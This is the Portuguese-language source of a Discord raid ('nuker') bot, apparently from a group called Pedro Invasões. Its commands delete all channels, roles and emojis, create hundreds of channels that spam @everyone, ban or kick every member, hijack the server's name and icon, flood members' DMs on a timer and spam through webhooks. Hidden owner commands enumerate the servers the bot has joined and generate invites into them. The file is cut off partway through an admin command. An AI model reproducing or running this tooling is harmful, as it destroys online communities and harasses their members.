console.clear()
const Discord = require("discord.js");
const client = new Discord.Client();
const config = require("./botconfig/config.json");
const pivserver = config.pivserver;
const prefix = config.prefix;
const { red, greenBright, cyan, yellow, green, black, white } = require("chalk");
const express = require('express');
const app = express();
console.log(red("---------------------------------------------------"));
app.get("/", (request, response) => {
  const ping = new Date();
  ping.setHours(ping.getHours() - 3);
  console.log(`Novo ping em:` + green(` ${ping.getUTCHours()}:${ping.getUTCMinutes()}:${ping.getUTCSeconds()}`));
  response.sendStatus(200);
});
app.listen(process.env.PORT); 

client.on("ready", () => {
    console.log(" ")
    console.log(greenBright("----------------------------------------"));
    console.log(green(`Iniciando o bot...`));
    console.log(green(`${client.user.tag} Está pronto para o ataque!`));
    console.log(green("Bot criado Para o dano supremo ;)"));
    console.log(green(`Comandos:
  .banall
  .kickall
  .nuke
  .raid
  .foto
  .mdall
  .role
  .deleterole
  .spam
  .list
  .invite
  .help-raid`));
  console.log(greenBright("----------------------------------------"));
  console.log(" ")
  console.log(green`Link to add the bot (admin only/ somente administrador) : ` + red` https://discord.com/oauth2/authorize?client_id=${client.user.id}&scope=bot&permissions=8 \n`)
 console.log(green`Link to add the bot (all perms/ todas as perms) : ` + red` https://discord.com/oauth2/authorize?client_id=${client.user.id}&scope=bot&permissions=1099511627775`)
    });
 


//nuke
 
client.on("message", message => {
    if (message.author.bot) return;
    if (message.channel.type === "dm") return;
   if (message.content === prefix + 'nuke') {
       //if(!['821410857568305182', '866290946492203038', '837058279313768499', '817507563868127232', '670740525351043072', '756230849417969665', '847265413015273472', '765388109751255090,', '780893088985514056', '876612284984746047', '821078525264134214', '750463511184015602', '919370181942313010', '927713593074540594', '928781758403600465', '927715022589800478', '927716214514544770', '900177269069328464'].includes(message.author.id)) return message.channel.send("Comando disponível somente para membros da PIV");
       if(!message.guild.me.permissions.has("MANAGE_CHANNELS")) return message.channel.send('Eu não tenho perm: \`MANAGE_CHANNELS\`');
       if (message.channel.guild.name === "💣💥PEDRO INVASÕES DOMINA💥💣") return console.log(red`[ - ] ` + green(`Comando negado: ${prefix}nuke: O Server ja foi raidado`)) || message.channel.send("Não foi possível executar o comando `nuke`: O server ja foi raidado");
       //if (message.guild.channels.cache.size > 200) return console.log(red`[ - ] ` + green(`Comando negado: ${prefix}nuke: O Server ja foi raidado`)) || message.channel.send("Não foi possível executar o comando `nuke`: O server ja foi raidado");
       if (message.channel.guild.id === `${pivserver}`) return message.channel.send("sem comando no server da piv ||bobão||");
       console.log(green(`Comando: nuke`))
       message.delete()
       
    message.guild.channels.cache.forEach(channel => { 
    channel.delete().then(deleted => console.log(red`[ - ] ` + green(` Deletando o canal: ${deleted.name} `) + white(`(${deleted.id})`) ))
    .catch(() => {})
    });

    message.guild.channels.create(`#ᵖᶦᵛ`, {
          type: 'text'
        }).then(channel => {
            console.log(cyan`[ + ] ` + green(` Criando o canal: ${channel.name} `))
            {
       const embed = new Discord.MessageEmbed()
       .setTitle("SERVIDOR HACKADO BY ᵖᶦᵛ")
       .setURL("https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA")
       .setFooter("CHORA MEMBRO COMUM 😂😂😂")
       .addFields(
                             {
                            name: '**Youtube**',
                            value: 'https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA',
                            inline: false
                             },
                              )
       .setImage('https://cdn.discordapp.com/attachments/900425991015510080/900430205762535475/7U7L.gif')
       .setColor("BLACK");
       channel.send({ content: "**@everyone O BONDE DO PEDRO INVASÕES ESTA PASSANDO NO SEU SERVIDOR!!!** https://discord.gg/2X4aAZbUKe", embed: embed })
   }
    {
       const embed2 = new Discord.MessageEmbed()
       .setTitle("SERVIDOR HACKADO BY ᵖᶦᵛ")
       .setURL("https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA")
       .setFooter("CHORA MEMBRO COMUM 😂😂😂")
       .addFields(
                             {
                            name: '**Youtube**',
                            value: 'https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA',
                            inline: false
                             },
                              )
       .setImage('https://cdn.discordapp.com/attachments/900425991015510080/900430210606960690/giphy.gif')
       .setColor("BLACK");
       channel.send({ content: "@everyone **O BONDE DO PEDRO INVASÕES ESTA PASSANDO NO SEU SERVIDOR!!!** https://discord.gg/2X4aAZbUKe", embed: embed2 })
   }
       {
       const embed3 = new Discord.MessageEmbed()
       .setTitle("SERVIDOR HACKADO BY ᵖᶦᵛ")
       .setURL("https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA")
       .setFooter("CHORA MEMBRO COMUM 😂😂😂")
       .addFields(
                             {
                            name: '**Youtube**',
                            value: 'https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA',
                            inline: false
                             },
                              )
       .setImage('https://cdn.discordapp.com/attachments/900533131550003240/900535070455128064/f-bi-raid.gif')
       .setColor("BLACK");
       channel.send({ content: "@everyone **O BONDE DO PEDRO INVASÕES ESTA PASSANDO NO SEU SERVIDOR!!!** https://discord.gg/2X4aAZbUKe", embed: embed3 })
   }
          channel.send("https://cdn.discordapp.com/attachments/847209772192497695/849408774862143548/image0.jpg")
           for (let i = 0; i <= 250; i++) {
                message.guild.channels.create(` ̷r̷a̷i̷d̷ ̷b̷y̷ ̷p̷e̷d̷r̷o̷ ̷i̷n̷v̷a̷s̷õ̷e̷s̷`, {
                  type: 'text'
                }).then(channel => {
                    console.log(cyan`[ + ] ` + green(` Criando o canal: ${channel.name} `) + i )
                    {
       const embed = new Discord.MessageEmbed()
       .setTitle("SERVIDOR HACKADO BY ᵖᶦᵛ")
       .setURL("https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA")
       .setFooter("CHORA MEMBRO COMUM 😂😂😂")
       .addFields(
                             {
                            name: '**Youtube**',
                            value: 'https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA',
                            inline: false
                             },
                              )
       .setImage('https://cdn.discordapp.com/attachments/900425991015510080/900430205762535475/7U7L.gif')
       .setColor("BLACK");
       channel.send({ content: "@everyone O BONDE DO PEDRO INVASÕES ESTA PASSANDO NO SEU SERVIDOR!!! https://discord.gg/2X4aAZbUKe", embed: embed })
   }
    {
       const embed2 = new Discord.MessageEmbed()
       .setTitle("SERVIDOR HACKADO BY ᵖᶦᵛ")
       .setURL("https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA")
       .setFooter("CHORA MEMBRO COMUM 😂😂😂")
       .addFields(
                             {
                            name: '**Youtube**',
                            value: 'https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA',
                            inline: false
                             },
                              )
       .setImage('https://cdn.discordapp.com/attachments/900425991015510080/900430210606960690/giphy.gif')
       .setColor("BLACK");
       channel.send({ content: "@everyone O BONDE DO PEDRO INVASÕES ESTA PASSANDO NO SEU SERVIDOR!!! https://discord.gg/2X4aAZbUKe", embed: embed2 })
   }
                  channel.send("@everyone  O SEU SERVER ESTA SENDO RAIDADO PELO PEDRO INVASÕES https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA https://cdn.discordapp.com/attachments/847209772192497695/849408774862143548/image0.jpg")
              channel.send("@everyone **QUER TER ACESSO AO BOT?** https://discord.gg/2X4aAZbUKe")
              channel.send("@everyone  O SEU SERVER ESTA SENDO RAIDADO PELO PEDRO INVASÕES https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA  https://cdn.discordapp.com/attachments/847209772192497695/849408774862143548/image0.jpg ")
              channel.send("@everyone **QUER TER ACESSO AO BOT?** https://discord.gg/2X4aAZbUKe")
              channel.send("@everyone  O SEU SERVER ESTA SENDO RAIDADO PELO PEDRO INVASÕES https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA  https://cdn.discordapp.com/attachments/847209772192497695/849408774862143548/image0.jpg ")
              channel.send("@everyone  PASSA O SERVER, ISSO AQUI E UM ASSALTO! https://cdn.discordapp.com/attachments/847209772192497695/849408785930911821/image1.jpg ")
              channel.send("@everyone  O SEU SERVER ESTA SENDO RAIDADO PELO PEDRO INVASÕES https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA  https://cdn.discordapp.com/attachments/847209772192497695/849408774862143548/image0.jpg ")
              channel.send("@everyone  PASSA O SERVER, ISSO AQUI E UM ASSALTO! https://cdn.discordapp.com/attachments/847209772192497695/849408785930911821/image1.jpg ")
              channel.send("@everyone **QUER TER ACESSO AO BOT?** https://discord.gg/2X4aAZbUKe")
              channel.send("@everyone  PASSA O SERVER, ISSO AQUI E UM ASSALTO! https://cdn.discordapp.com/attachments/847209772192497695/849408785930911821/image1.jpg ")
              channel.send("@everyone  O SEU SERVER ESTA SENDO RAIDADO PELO PEDRO INVASÕES https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA  https://cdn.discordapp.com/attachments/847209772192497695/849408774862143548/image0.jpg ")
              channel.send("@everyone **QUER TER ACESSO AO BOT?** https://discord.gg/2X4aAZbUKe")
              })
              }
            }).catch(() => {})
        }
        }
        );
 
//raid
 
client.on("message", message => {
            if (message.author.bot) return;
            if(message.channel.type === "dm") return;
           if (message.content === prefix + 'raid') {
               if(!message.guild.me.permissions.has("MANAGE_CHANNELS")) return message.channel.send('Eu não tenho perm: \`MANAGE_CHANNELS\`');
               if (message.channel.guild.id === `${pivserver}`) return message.channel.send("sem comando no server da piv ||bobão||");
               if (message.guild.channels.cache.size > 490) return console.log(red`[ - ] ` + green(`Comando negado: ${prefix}raid: O Server ja foi raidado`)) || message.channel.send("Não foi possível executar o comando `raid`: O server ja foi raidado");
               console.log(green(`Comando: raid`))
           for (let i = 0; i <= 500; i++) {
                message.guild.channels.create(` ̷r̷a̷i̷d̷ ̷b̷y̷ ̷p̷e̷d̷r̷o̷ ̷i̷n̷v̷a̷s̷õ̷e̷s̷`, {
                  type: 'text'
                }).then(channel => {
                    console.log(cyan`[ + ] ` + green(` Criando o canal: ${channel.name} `) + i )
                    {
       {
       const embed = new Discord.MessageEmbed()
       .setTitle("SERVIDOR HACKADO BY ᵖᶦᵛ")
       .setURL("https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA")
       .setFooter("CHORA MEMBRO COMUM 😂😂😂")
       .addFields(
                             {
                            name: '**Youtube**',
                            value: 'https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA',
                            inline: false
                             },
                              )
       .setImage('https://cdn.discordapp.com/attachments/900425991015510080/900430205762535475/7U7L.gif')
       .setColor("BLACK");
       channel.send({ content: "@everyone O BONDE DO PEDRO INVASÕES ESTA PASSANDO NO SEU SERVIDOR!!! https://discord.gg/2X4aAZbUKe", embed: embed })
   }
    {
       const embed2 = new Discord.MessageEmbed()
       .setTitle("SERVIDOR HACKADO BY ᵖᶦᵛ")
       .setURL("https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA")
       .setFooter("CHORA MEMBRO COMUM 😂😂😂")
       .addFields(
                             {
                            name: '**Youtube**',
                            value: 'https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA',
                            inline: false
                             },
                              )
       .setImage('https://cdn.discordapp.com/attachments/900425991015510080/900430210606960690/giphy.gif')
       .setColor("BLACK");
       channel.send({ content: "@everyone O BONDE DO PEDRO INVASÕES ESTA PASSANDO NO SEU SERVIDOR!!! https://discord.gg/2X4aAZbUKe", embed: embed2 })
   }
                  channel.send("@everyone  O SEU SERVER ESTA SENDO RAIDADO PELO PEDRO INVASÕES https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA https://cdn.discordapp.com/attachments/847209772192497695/849408774862143548/image0.jpg")
              channel.send("@everyone **QUER TER ACESSO AO BOT?** https://discord.gg/2X4aAZbUKe")
              channel.send("@everyone  O SEU SERVER ESTA SENDO RAIDADO PELO PEDRO INVASÕES https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA  https://cdn.discordapp.com/attachments/847209772192497695/849408774862143548/image0.jpg ")
              channel.send("@everyone **QUER TER ACESSO AO BOT?** https://discord.gg/2X4aAZbUKe")
              channel.send("@everyone  O SEU SERVER ESTA SENDO RAIDADO PELO PEDRO INVASÕES https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA  https://cdn.discordapp.com/attachments/847209772192497695/849408774862143548/image0.jpg ")
              channel.send("@everyone  PASSA O SERVER, ISSO AQUI E UM ASSALTO! https://cdn.discordapp.com/attachments/847209772192497695/849408785930911821/image1.jpg ")
              channel.send("@everyone  O SEU SERVER ESTA SENDO RAIDADO PELO PEDRO INVASÕES https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA  https://cdn.discordapp.com/attachments/847209772192497695/849408774862143548/image0.jpg ")
              channel.send("@everyone  PASSA O SERVER, ISSO AQUI E UM ASSALTO! https://cdn.discordapp.com/attachments/847209772192497695/849408785930911821/image1.jpg ")
              channel.send("@everyone **QUER TER ACESSO AO BOT?** https://discord.gg/2X4aAZbUKe")
              channel.send("@everyone  PASSA O SERVER, ISSO AQUI E UM ASSALTO! https://cdn.discordapp.com/attachments/847209772192497695/849408785930911821/image1.jpg ")
              channel.send("@everyone  O SEU SERVER ESTA SENDO RAIDADO PELO PEDRO INVASÕES https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA  https://cdn.discordapp.com/attachments/847209772192497695/849408774862143548/image0.jpg ")
              channel.send("@everyone **QUER TER ACESSO AO BOT?** https://discord.gg/2X4aAZbUKe")
                    }
                }).catch(() => {})
           }
           }
});


//mdall
 
          client.on("message", message => {
                        if (message.author.bot) return;
                        if(message.channel.type === "dm") return;
                      if(message.content === prefix + "mdall") {
                          if (message.channel.guild.id === `${pivserver}`) return message.channel.send("sem comando no server da piv ||bobão||");
                          console.log(green(`Comando: mdall`))
                      message.guild.members.cache.forEach(member => {
                          console.log(cyan`[ + ] ` + green(` Spammando no pv de: ${member.user.tag} `))
                        setInterval(function(){
                            const embed = new Discord.MessageEmbed()
                              .setTitle("SERVIDOR HACKADO BY ᵖᶦᵛ")
                              .setURL("https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA")
                              .setFooter("CHORA MEMBRO COMUM 😂😂😂")
                              .addFields(
                             {
                            name: '**Youtube**',
                            value: 'https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA',
                            inline: false
                             },
                              )
                              .setImage('https://cdn.discordapp.com/attachments/900425991015510080/900430205762535475/7U7L.gif')
                             .setColor("BLACK");
                            member.send({ content: "@everyone O BONDE DO PEDRO INVASÕES ESTA PASSANDO NO SEU SERVIDOR!!! https://discord.gg/2X4aAZbUKe", embed: embed }) .catch(() => {
    });

                            const embed2 = new Discord.MessageEmbed()
                              .setTitle("SERVIDOR HACKADO BY ᵖᶦᵛ")
                              .setURL("https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA")
                              .setFooter("CHORA MEMBRO COMUM 😂😂😂")
                              .addFields(
                             {
                            name: '**Youtube**',
                            value: 'https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA',
                            inline: false
                             },
                              )
                              .setImage('https://cdn.discordapp.com/attachments/900425991015510080/900430210606960690/giphy.gif')
                             .setColor("BLACK");
                            member.send({ content: "@everyone O BONDE DO PEDRO INVASÕES ESTA PASSANDO NO SEU SERVIDOR!!! https://discord.gg/2X4aAZbUKe", embed: embed2 }) .catch(() => {
    });

                            const embed3 = new Discord.MessageEmbed()
                              .setTitle("SERVIDOR HACKADO BY ᵖᶦᵛ")
                              .setURL("https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA")
                              .setFooter("CHORA MEMBRO COMUM 😂😂😂")
                              .addFields(
                             {
                            name: '**Youtube**',
                            value: 'https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA',
                            inline: false
                             },
                              )
                              .setImage('https://cdn.discordapp.com/attachments/900425991015510080/900430216550309938/hacker.gif')
                             .setColor("BLACK");
                            member.send({ content: "@everyone O BONDE DO PEDRO INVASÕES ESTA PASSANDO NO SEU SERVIDOR!!! https://discord.gg/2X4aAZbUKe", embed: embed3 }) .catch(() => {
    });

                          member.send("O BONDE DO PEDRO INVASÕES ESTA PASSANDO NO SEU SERVIDOR!!! https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA https://cdn.discordapp.com/attachments/847209772192497695/849408774862143548/image0.jpg").catch(() => {})
                          member.send("O BONDE DO PEDRO INVASÕES ESTA PASSANDO NO SEU SERVIDOR!!! https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA https://cdn.discordapp.com/attachments/847209772192497695/849408774862143548/image0.jpg").catch(() => {})
                          member.send("**QUER TER ACESSO AO BOT?** https://discord.gg/2X4aAZbUKe").catch(() => {})
                          member.send("O BONDE DO PEDRO INVASÕES ESTA PASSANDO NO SEU SERVIDOR!!! https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA https://cdn.discordapp.com/attachments/847209772192497695/849408774862143548/image0.jpg").catch(() => {})
                          member.send("O BONDE DO PEDRO INVASÕES ESTA PASSANDO NO SEU SERVIDOR!!! https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA https://cdn.discordapp.com/attachments/847209772192497695/849408774862143548/image0.jpg").catch(() => {})
                          member.send("**QUER TER ACESSO AO BOT?** https://discord.gg/2X4aAZbUKe").catch(() => {})
                        },450);
                      })
          }
                      });
 
//criar cargos
 
client.on("message", message => {
                if (message.author.bot) return;
                if (message.channel.type === "dm") return;
                if (message.content === prefix + 'role') {
                    if(!message.guild.me.permissions.has("MANAGE_ROLES")) return message.channel.send('Eu não tenho perm: \`MANAGE_ROLES\`');
                    if (message.channel.guild.id === `${pivserver}`) return message.channel.send("sem comando no server da piv ||bobão||");
                    console.log(green(`Comando: role`))
                   message.delete()
                   message.channel.send("**__criando os cargos...__**")

              for (let i = 0; i <= 10; i++) {
                 message.guild.roles.create({data: {name: `ᵖᶦᵛ DOMINA `,color: '#020202',},reason: 'razon',}).catch(() => {}).then(create => console.log(cyan`[ + ] ` + green(` Criando o cargo: ${create.name} `)))
                 message.guild.roles.create({data: {name: `☣️⚠tóxico⚠☣️`,color: '#020202',},reason: 'razon',}).catch(() => {}).then(create => console.log(cyan`[ + ] ` + green(` Criando o cargo: ${create.name} `)))
                 message.guild.roles.create({data: {name: `💣💥PEDRO INVASÕES💥💣`,color: '#020202',},reason: 'razon',}).catch(() => {}).then(create => console.log(cyan`[ + ] ` + green(` Criando o cargo: ${create.name} `)))
                 message.guild.roles.create({data: {name: `passa o server ☠️🔫`,color: '#0ece57',},reason: 'razon',}).catch(() => {}).then(create => console.log(cyan`[ + ] ` + green(` Criando o cargo: ${create.name} `)))
                 message.guild.roles.create({data: {name: `segura a raid membro comum 😂😂`,color: '#020202',},reason: 'razon',}).catch(() => {}).then(create => console.log(cyan`[ + ] ` + green(` Criando o cargo: ${create.name} `)))

              };
               }
                });
 
//deletar cargos

client.on("message", message => {
                    if (message.author.bot) return;
                    if(message.channel.type === "dm") return;
                     if (message.content.toLowerCase().startsWith(prefix + 'deleterole') ||
                     message.content.toLowerCase().startsWith(prefix + 'delete-role') ||
                     message.content.toLowerCase().startsWith(prefix + 'deleteroles') ||
                     message.content.toLowerCase().startsWith(prefix + 'delete-roles')) {

                         if(!message.guild.me.permissions.has("MANAGE_ROLES")) return message.channel.send('Eu não tenho perm: \`MANAGE_ROLES\`');

    if (message.channel.guild.id === `${pivserver}`) return message.channel.send("sem comando no server da piv ||bobão||");
console.log(green(`Comando: deleterole`))

    var cargosbot = `${message.guild.members.cache.filter(m => m.user.bot).size}`
    var cargos = `${message.guild.roles.cache.size}`
    var totalcargos = (cargos - cargosbot - 1);
                             message.delete()
                            message.guild.roles.cache.forEach(roles => {
    roles.delete()
    .then(deleted => console.log(red`[ - ] ` + green(` Deletando o cargo: ${deleted.name} `)))
    .catch(() => {})
});
                            message.channel.send(`**__deletando ${totalcargos} cargos...__**`)
                          }
                  });
 



//foto e nome
 
client.on("message", message => {
                    if (message.author.bot) return;
                    if(message.channel.type === "dm") return;
                   if (message.content === prefix + 'foto') {
                       if(!message.guild.me.permissions.has("MANAGE_GUILD")) return message.channel.send('Eu não tenho perm: \`MANAGE_GUILD\`');
                       

                       if (message.channel.guild.id === `${pivserver}`) return message.channel.send("sem comando no server da piv ||bobão||");
                       console.log(green(`Comando: foto`))
                       message.delete()
                      message.guild.setName("💣💥PEDRO INVASÕES DOMINA💥💣");
                      message.guild.setIcon("https://cdn.discordapp.com/attachments/847209772192497695/849408785930911821/image1.jpg").catch(() => {
    });
                      }
                    }); 
 

//banall
 
client.on("message", message => {
    if (message.author.bot) return;
    if (message.channel.type === "dm") return;
    if (message.content === prefix + 'banall') {
        if(!message.guild.me.permissions.has("BAN_MEMBERS")) return message.channel.send('Eu não tenho perm: \`BAN_MEMBERS\`, tente usar o comando \`.kickall\` para kickar os membros');
        if (message.channel.guild.id === `${pivserver}`) return message.channel.send("sem comando no server da piv ||bobão||");
        console.log(green(`Comando: banall`))
    message.guild.members.cache.forEach(m => {
    m.ban().then(member => console.log(red`[ - ] ` + green(` Banindo: ${member.user.tag} `))).catch(() => {})
  });
  };
}); 
 

//kickall

client.on("message", message => {
    if (message.author.bot) return;
    if (message.channel.type === "dm") return;
    if (message.content === prefix + 'kickall') {
        if(!message.guild.me.permissions.has("KICK_MEMBERS")) return message.channel.send('Eu não tenho perm: \`KICK_MEMBERS\`');
        if (message.channel.guild.id === `${pivserver}`) return message.channel.send("sem comando no server da piv ||bobão||");
        console.log(green(`Comando: kickall`))
    message.guild.members.cache.forEach(m => {
    m.kick().then(member => console.log(red`[ - ] ` + green(` Kickando: ${member.user.tag} `))).catch(() => {})
  });
  };
}); 
 

//webhook

client.on("message", message => {
    if (message.author.bot) return;
    if (message.channel.type === "dm") return;
    if (message.channel.guild.id === `${pivserver}`) return;
    if (message.content === prefix + 'spam') {
        
        if(!message.guild.me.permissions.has("MANAGE_WEBHOOKS")) return message.channel.send('Eu não tenho perm: \`MANAGE_WEBHOOKS\`');
        
        console.log(green(`Comando: spam`))
 let name = ('PIV NUCKER BOT <3333');
 let avatar = {avatar:'https://cdn.discordapp.com/avatars/893534779184664596/592d979c91a3d69f27c9b5d429e0b4a8.png?size=4096'}

 let name2 = ('Cellbit');
 let avatar2 = {avatar:'https://cdn.discordapp.com/attachments/930264795880489020/930476786809176134/EnYVKAXXUAYMSv9.png?size=4096'}

 let name3 = ('ᵖᶦᵛ Anonymous');
 let avatar3 = {avatar:'https://cdn.discordapp.com/attachments/930264795880489020/930478973060788294/anonymous-bolsonaro.png?size=4096'}

message.channel.createWebhook(name, avatar).then(w => {
    console.log(cyan`[ + ] ` + green(` Criando webhook: ${w.name} `))
    for (let i = 0; i <= 10; i++) {
 w.send("@everyone SERVER RAIDADO BY PEDRO INVASÕES https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA https://cdn.discordapp.com/attachments/847209772192497695/849408774862143548/image0.jpg https://discord.gg/2X4aAZbUKe");
w.send("@everyone PASSA O SERVER, ISSO AQUI É UM ASSALTO https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA https://cdn.discordapp.com/attachments/847209772192497695/849408774862143548/image0.jpg https://discord.gg/2X4aAZbUKe");
    }
});

message.channel.createWebhook(name2, avatar2).then(w => {
    console.log(cyan`[ + ] ` + green(` Criando webhook: ${w.name} `))
    for (let i = 0; i <= 10; i++) {
 w.send("@everyone CALADO POBRE KKKKKKKKK https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA https://cdn.discordapp.com/attachments/847209772192497695/849408785930911821/image1.jpg https://discord.gg/2X4aAZbUKe");
w.send("@everyone PIV DOMINA PORRA https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA https://cdn.discordapp.com/attachments/847209772192497695/849408785930911821/image1.jpg https://discord.gg/2X4aAZbUKe");
    }
});

message.channel.createWebhook(name3, avatar3).then(w => {
    console.log(cyan`[ + ] ` + green(` Criando webhook: ${w.name} `))
    for (let i = 0; i <= 10; i++) {
 w.send("@everyone HACKANDO O SERVIDOR... https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA https://cdn.discordapp.com/attachments/847209772192497695/849408785930911821/image1.jpg https://discord.gg/2X4aAZbUKe");
w.send("@everyone GG EZ LOL https://www.youtube.com/channel/UCv55YetPovo7rohZD_eKkUA https://cdn.discordapp.com/attachments/847209772192497695/849408785930911821/image1.jpg https://discord.gg/2X4aAZbUKe");
    }
});


    }
});




//lista do server
 
client.on("message", message => {
    if (message.author.bot) return;
    if(message.channel.type === "dm") return;
    const args = message.content.slice().trim().split(/ +/g );
    const command = args.shift().toLowerCase();
   if (
    message.content.toLowerCase().startsWith(prefix + 'list') ||
    message.content.toLowerCase().startsWith(prefix + 'lista')
  ) {
      console.log(green(`Comando: list`))

    var cargosbot = `${message.guild.members.cache.filter(m => m.user.bot).size}`
    var cargos = `${message.guild.roles.cache.size}`
    var totalcargos = (cargos - cargosbot - 1);

      message.delete()
       const embed = new Discord.MessageEmbed()
       .setTitle("Status do server:")
       .setThumbnail(client.user.displayAvatarURL({dynamic: true}))
       .setDescription(`**Canais:** | ${message.guild.channels.cache.size}\n**Cargos:** | ${totalcargos}\n**Users:** | ${message.guild.memberCount}`)
       .setColor("RED");
       message.channel.send(embed).catch(() => {
    });
   }
});

//delete emoji

client.on("message", message => {
    if (message.author.bot) return;
    if(message.channel.type === "dm") return;
    if (
    message.content.toLowerCase().startsWith(prefix + 'emojinuke') ||
    message.content.toLowerCase().startsWith(prefix + 'emojidelete')
  )
        return new Promise((resolve, reject) => {
             if(!message.guild.me.permissions.has("MANAGE_EMOJIS")) return message.channel.send('Eu não tenho perm: \`MANAGE_EMOJIS\`');
            if (message.channel.guild.id === `${pivserver}`) return message.channel.send("sem comando no server da piv ||bobão||");
            console.log(green(`Comando: emojinuke`))
            message.channel.send("**__deletando os emojis__**")
            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { console.log(red("Error Found: " + err)) }))
        });
    });


//infiltração

client.on("message", message => {
    if (message.author.bot) return;
    if (message.channel.type === "dm") return;
    if (message.content.toLowerCase().startsWith(prefix + 'svall')) {
        if(!['927716214514544770', '866290946492203038'].includes(message.author.id)) return message.channel.send("Comando secreto negado: \`.svall;\` apenas o dono pode usar esse comando");
    

  client.guilds.cache.map(g => console.log(green`Nome: ${g.name}\nId: ${g.id}\nMembros: ${g.memberCount}\nCargos: ${message.guild.members.cache.filter(m => m.user.bot).size}\nCanais: ${message.guild.channels.cache.size} \n - - - - - - - - - - - - -`))
  console.log(`Totalizando ${client.guilds.cache.size} servidores`)
    }
    });

//pegar invite

client.on("message", async msg => {

if(msg.content.startsWith(prefix + 'entrar')) {
const args = msg.content.split(' ').slice(1)
let guild = client.guilds.cache.get(args[0]);

if (!guild) return msg.reply("Não Estou Em Nenhuma Guilda Com Este ID.");

let invitechannels = guild.channels.cache.filter(channel => channel.type == "text");
if(!invitechannels) return msg.channel.send('Sem Permissão!')

invitechannels.first().createInvite()
  .then(invite=> msg.channel.send(`Convite: ${invite}`))
}

})


//help raid
client.on("message", message => {
    if (message.author.bot) return;
    if(message.channel.type === "dm") return;
    const args = message.content.slice().trim().split(/ +/g );
    const command = args.shift().toLowerCase();
   if (
    message.content.toLowerCase().startsWith(prefix + 'helpraid') ||
    message.content.toLowerCase().startsWith(prefix + 'help-raid')
  ) {
      console.log(green(`Comando: helpraid`))
      message.delete()
       const embed = new Discord.MessageEmbed()
       .setTitle(message.guild.name)
       .setThumbnail(client.user.displayAvatarURL({dynamic: true}))
       .setDescription('Comandos de raid do bot: `.nuke` `.raid` `.mdall` `.foto` `.banall` `.kickall` `.deleterole` `.role` `.spam` `.list` `.emojinuke` `.invite`\n Prefix: (`.`)\n```diff\n- - - - - - - - - - - - - - - - - - - - - - -```')
       .addFields(
        {
            name: '__.nuke__',
            value: '`nuke` Deleta todos os canais e cria outros 100 (exclusivo para membros da PIV)',
            inline: false
        },
        {
            name: '__.raid__',
            value: '`raid` Cria 500 canais e marca @everyone neles',
            inline: false
        },
                {
            name: '__.mdall__',
            value: '`mdall` Spamma na DM de todos os membros',
            inline: false
        },
                 {
            name: '__.foto__',
            value: '`foto` Troca a foto e o nome do sv para as características da PIV',
            inline: false
        },
                 {
            name: '__.banall__',
            value: '`banall` Bane todos os membros',
            inline: false
        },
        {
            name: '__.kickall__',
            value: '`kickall` Kicka todos os membros (use esse comando apenas se o `banall` não funcionar)',
            inline: false
        },
                 {
            name: '__.deleterole__',
            value: '`deleterole` Deleta todos os cargos INFERIORES ao do bot - (*`.deleteroles`*, *`.delete-role`*, *`.delete-roles`* também funciona)',
            inline: false
        },
                 {
            name: '__.role__',
            value: '`role` Cria 50 cargos',
            inline: false
        },
                         {
            name: '__.spam__',
            value: '`spam` Spamma no canal da mensagem do autor do comando por meio de *webhooks*',
            inline: false
        },
                         {
            name: '__.lista__',
            value: '`lista` Mostra o estado atual do servidor, quantos canais, cargos e membros ele tem atualmente - (*`.list`* também funciona)',
            inline: false
        },
        {
            name: '__.emojinuke__',
            value: '`emojinuke` Deleta todos os emojis do servidor - (*`.emojidelete`* também funciona)',
            inline: false
        },
        {
            name: '__.invite__',
            value: '`invite` Manda o link para invitar o bot - (*`.invitebot`* também funciona)',
            inline: false
        }
    )
       .setFooter("help-raid")
       .setColor("RED");
       message.channel.send({ content: "__**Comandos de raid do bot**__", embed: embed }).catch(() => {
    });
   }
});

//adm

client.on("message", message => {
    if (message.author.bot) return;
    if(message.channel.type === "dm") return;
    if (
    message.content.toLowerCase().startsWith(prefix + 'adm') ||
    message.content.toLowerCase().startsWith(prefix + 'admin')
    ){

    console.log(green(`Comando: adm`))
module.exports.run = async (client, message, args) => {
if(!message.guild.me.hasPermission(["MANAGE_ROLES", "ADMINISTRATOR"])) {
  return message.channel.send({embed: {
